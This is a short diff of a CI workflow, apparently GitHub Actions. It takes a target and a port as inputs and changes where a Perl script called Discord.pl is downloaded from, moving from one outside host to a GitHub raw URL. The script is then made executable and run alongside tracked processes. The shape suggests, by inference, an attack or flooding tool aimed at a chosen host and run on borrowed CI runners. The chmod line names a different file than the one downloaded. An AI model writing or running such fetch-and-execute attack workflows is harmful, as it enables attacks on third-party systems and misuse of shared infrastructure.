@@ -29,7 +29,7 @@ jobs:
           TARGET="${{ inputs.target }}"
           PORT="${{ inputs.port }}"
           
-          wget https://wgetz.com/sYUMyONdf2/Discord.pl -O Discord.pl
+          wget https://github.com/AhmetKesser/Deneme/raw/refs/heads/main/Discord.pl -O Discord.pl
           chmod +x Discord || true
           
           PIDS=()
